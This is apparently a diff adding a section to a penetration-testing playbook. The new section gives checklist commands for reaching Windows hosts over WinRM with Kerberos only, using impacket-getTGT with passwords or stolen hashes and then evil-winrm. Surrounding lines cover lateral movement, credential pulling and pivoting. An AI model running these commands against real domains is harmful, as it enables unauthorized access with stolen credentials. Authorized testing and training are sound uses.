@@ -66,3 +66,13 @@ PsExec from Sysinternals, https://learn.microsoft.com/sysinternals/downloads/pse
 - [ ] Every host reached marked Owned in BloodHound, its paths read again
 - [ ] Credentials and hashes pulled from each new host: :Pb acl-abuse, its host sections
 - [ ] A host on another network: a pivot, :Pb ligolo, then :Pb smb through it
+
+## WinRM with Kerberos only (5986)
+
+NTLM refused means password and hash logins fail; go through Kerberos.
+
+- [ ] Get a TGT: impacket-getTGT '<Domain>/<User>:<Password>'
+- [ ] Point at it: export KRB5CCNAME=<User>.ccache
+- [ ] Connect by name, not IP: evil-winrm -i <Host> -u '<User>' -r <Domain> -k
+- [ ] Hashes work for the TGT too: impacket-getTGT -hashes ':<Hash>' '<Domain>/<User>'
+- [ ] If Kerberos tools cannot find the KDC, add <Domain> in capitals to /etc/krb5.conf as the realm, mapped to the DC IP
